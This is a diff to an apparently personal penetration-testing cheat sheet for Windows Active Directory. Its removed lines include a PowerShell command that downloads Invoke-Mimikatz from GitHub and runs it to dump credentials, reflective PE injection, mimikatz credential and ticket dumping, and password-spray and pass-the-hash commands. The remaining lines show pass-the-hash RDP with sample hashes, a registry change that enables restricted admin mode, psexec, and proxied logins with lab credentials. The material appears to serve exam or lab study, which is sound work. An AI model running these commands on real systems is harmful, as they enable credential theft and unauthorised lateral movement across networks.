@@ -301,30 +301,6 @@ Change resourcedc.resourced.local machin_ip_address in /etc/hosts
 
 impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
 ```
-
-### Authentication
-#### Minikatz(require local admin)
-Load DemoEXE and run it locally.  
-```
-$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')  
-Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
-https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/Invoke-ReflectivePEInjection.ps1
-```
-Powershell run minikatz
-```
-powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
-```
-```
-password hash:
-1. privilege::debug
-2. sekurlsa::logonpasswords
-3. mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
-Cached Credentials:
-1. privilege::debug
-2. lsadump::cache
-TGT and TGS:
-1. sekurlsa::tickets
-```
 ### Lateral Movement
 /ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
 /ptt - no output in file, just inject the golden ticket in current session.
@@ -335,8 +311,6 @@ Local admin access results in a (Pwn3d!) added after the login confirmation, sho
 
 rdp(sometimes authentication not correct):
 (To enable passing the hash in xfreerdp, cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f')
-proxychains4 -f /etc/proxychains4.conf crackmapexec rdp 172.16.218.82 -u 'yoshi' -p 'Mushroom!'
-proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi' -p 'Mushroom!' -M rdp -o ACTION='ENABLE'(Admin privilege can turn on rdp on machine)
 proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com(if this user is localuser,do not specify domain!!!!!) /p:Mushroom! /v:172.16.218.82:port /cert-ignore
 xfreerdp /v:192.168.153.175 /cert-ignore /u:L.Livingstone /pth:19a3a7550ce8c505c2d46b5e39d6f808
 
@@ -346,13 +320,6 @@ proxychains4 -f /etc/proxychains4.conf smbclient //172.16.196.13/IPC$(sharename)
 
 mssql:
 impacket-mssqlclient relia.com/dnnuser:DotNetNukeDatabasePassword\!@192.168.192.248 -port 49965
-
-password spray:
-cme protocol ip.txt -u user1 user2 user3 -p pass1 pass2 pass3
-
-winrm:
-cme winrm ip -u celia.almeda -H 19a3a7550ce8c505c2d46b5e39d6f808
-cme winrm ip -u celia.almeda -p password
 ```
 
 ###### Dump the local password hash and domain cached hash
